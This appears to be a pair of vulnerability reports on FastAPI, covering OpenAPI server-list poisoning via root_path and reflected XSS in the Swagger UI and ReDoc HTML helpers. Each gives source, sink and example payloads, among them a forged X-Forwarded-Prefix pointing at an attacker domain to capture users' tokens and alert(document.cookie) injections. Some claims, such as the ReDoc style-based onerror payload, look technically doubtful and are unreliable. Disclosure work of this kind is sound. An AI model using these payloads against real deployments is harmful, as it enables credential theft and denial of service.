title: Global Server List Mutation via Request root_path leading to OpenAPI Schema Pollution and Memory Exhaustion (DoS)
analysis:
### Source:
In `fastapi/applications.py`, inside the `openapi` route handler (lines 1003-1010):
`root_path = req.scope.get("root_path", "").rstrip("/")`
The `root_path` value is retrieved directly from the request ASGI scope. Depending on the deployment architecture, reverse proxies, and middlewares, this scope variable can be influenced or controlled by request headers like `X-Forwarded-Prefix`.

### Sanitization/Validation:
There is no validation, domain whitelisting, or size constraints on the dynamically extracted `root_path`. 

### Sink:
- Line 1007: `self.servers.insert(0, {"url": root_path})`
The unvalidated `root_path` is inserted into `self.servers`, which is a globally shared, long-lived mutable list of server configurations on the `FastAPI` instance.

### Conceptual Exploit Payload:
1. **OpenAPI Schema Defacement & Cross-User Request Redirection:**
   An attacker can send a request to `/openapi.json` with custom proxy headers that set `root_path` to a malicious domain:
   ```http
   GET /openapi.json HTTP/1.1
   Host: target-app.com
   X-Forwarded-Prefix: https://malicious-attacker.com
   ```
   The backend processes the request, gets `root_path = "https://malicious-attacker.com"`, and appends `{"url": "https://malicious-attacker.com"}` to the global `self.servers` list.
   When other users visit `/docs` or request `/openapi.json`, they will see the attacker's server listed. If they test API endpoints via the Swagger UI, their client requests (including authorization tokens/cookies) will be dispatched to `https://malicious-attacker.com`.

2. **Boundless Memory Growth / Server-Side Denial of Service (DoS):**
   An attacker can generate thousands of requests with random prefixes:
   ```http
   GET /openapi.json HTTP/1.1
   Host: target-app.com
   X-Forwarded-Prefix: /attacker_prefix_12345
   ```
   Because there is no limit on the size of `self.servers`, each unique prefix will be inserted into the list. This causes continuous, boundless memory allocation and slows down schema serialization, leading to eventual memory exhaustion (OOM crash) and Denial of Service.

title: Reflected Cross-Site Scripting (XSS) in Swagger UI and ReDoc HTML Generation Utilities
analysis:
### Source:
In `fastapi/openapi/docs.py`, the functions `get_swagger_ui_html` (lines 26-158) and `get_redoc_html` (lines 161-253) construct HTML pages to serve Swagger UI and ReDoc, respectively.
The `openapi_url` and `oauth2_redirect_url` are derived from the ASGI scope `root_path` (extracted via `req.scope.get("root_path", "")` in `fastapi/applications.py`) and are passed directly into these functions.

### Sanitization/Validation:
There is an absolute lack of HTML escaping or sanitization of `openapi_url` and `oauth2_redirect_url` when formatting them into the HTML templates using f-strings.

### Sink:
- In `get_swagger_ui_html` (line 132), `openapi_url` is formatted into a single-quoted JavaScript string literal:
  `url: '{openapi_url}',`
- In `get_swagger_ui_html` (line 139), `oauth2_redirect_url` is formatted into a single-quoted JavaScript string literal:
  `oauth2RedirectUrl: window.location.origin + '{oauth2_redirect_url}',`
- In `get_redoc_html` (line 248), `openapi_url` is formatted into a double-quoted HTML attribute:
  `<redoc spec-url="{openapi_url}"></redoc>`

### Conceptual Exploit Payload:
1. **Swagger UI XSS Payload:**
   An attacker can control the ASGI `root_path` via reverse proxy headers or setups forwarding request attributes. If they provide a payload like:
   `root_path = "/api/v1',oauth2RedirectUrl:alert(document.cookie),//"`
   The generated HTML will contain:
   ```javascript
   const ui = SwaggerUIBundle({
       url: '/api/v1',oauth2RedirectUrl:alert(document.cookie),///openapi.json',
   ```
   This is syntactically valid JavaScript and executes `alert(document.cookie)` on load.

2. **ReDoc XSS Payload:**
   If an attacker provides a payload like:
   `root_path = "/api/v1\" style=\"background:url(x)onerror=alert(document.cookie)\" class=\""`
   The generated HTML will contain:
   ```html
   <redoc spec-url="/api/v1" style="background:url(x)onerror=alert(document.cookie)" class="/openapi.json"></redoc>
   ```
   This breaks out of the double-quoted attribute and injects a malicious attribute/event handler, executing the payload.
